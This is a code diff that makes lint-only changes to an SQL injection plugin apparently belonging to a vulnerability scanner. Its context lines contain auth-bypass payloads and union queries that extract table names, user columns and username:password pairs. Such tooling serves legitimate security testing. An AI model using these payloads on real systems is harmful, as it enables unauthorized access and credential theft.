@@ -14,7 +14,6 @@ from __future__ import annotations
 
 import asyncio
 import json
-import subprocess
 import tempfile
 import time
 from pathlib import Path
@@ -468,7 +467,7 @@ class SQLiPlugin(VulnerabilityPlugin):
         # Extract DB version
         version = await self._extract_via_column(
             param, params, col_count, reflect_col,
-            f"version()",
+            "version()",
         )
         if version:
             extracted["db_version"] = version
@@ -476,7 +475,7 @@ class SQLiPlugin(VulnerabilityPlugin):
         # Extract table names
         tables = await self._extract_via_column(
             param, params, col_count, reflect_col,
-            f"(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
+            "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
         )
         if tables:
             extracted["tables"] = tables.split(",")
@@ -485,7 +484,7 @@ class SQLiPlugin(VulnerabilityPlugin):
         if tables and "users" in tables:
             columns = await self._extract_via_column(
                 param, params, col_count, reflect_col,
-                f"(SELECT string_agg(column_name||':'||data_type,',') FROM information_schema.columns WHERE table_name='users')",
+                "(SELECT string_agg(column_name||':'||data_type,',') FROM information_schema.columns WHERE table_name='users')",
             )
             if columns:
                 extracted["users_columns"] = columns.split(",")
@@ -493,7 +492,7 @@ class SQLiPlugin(VulnerabilityPlugin):
         # Extract sample user data
         users = await self._extract_via_column(
             param, params, col_count, reflect_col,
-            f"(SELECT string_agg(username||':'||password,',' ) FROM users LIMIT 5)",
+            "(SELECT string_agg(username||':'||password,',' ) FROM users LIMIT 5)",
         )
         if users:
             extracted["sample_users"] = users.split(",")
@@ -532,9 +531,9 @@ class SQLiPlugin(VulnerabilityPlugin):
     async def _test_auth_bypass_get(self, param: str, params: dict[str, str]) -> dict[str, Any] | None:
         """Test authentication bypass via SQLi (GET parameters)."""
         bypass_payloads = [
-            f"' OR '1'='1",
-            f"' OR 1=1--",
-            f"admin'--",
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "admin'--",
         ]
 
         for payload in bypass_payloads:
@@ -1044,9 +1043,9 @@ class SQLiPlugin(VulnerabilityPlugin):
 
             # Add payload body with * on vulnerable param
             if param == "email":
-                body = f'{{"email":"test@test.com*","password":"test"}}'
+                body = '{"email":"test@test.com*","password":"test"}'
             elif param == "username":
-                body = f'{{"username":"test*","password":"test"}}'
+                body = '{"username":"test*","password":"test"}'
             else:
                 body = f'{{"{param}":"test*"}}'
 
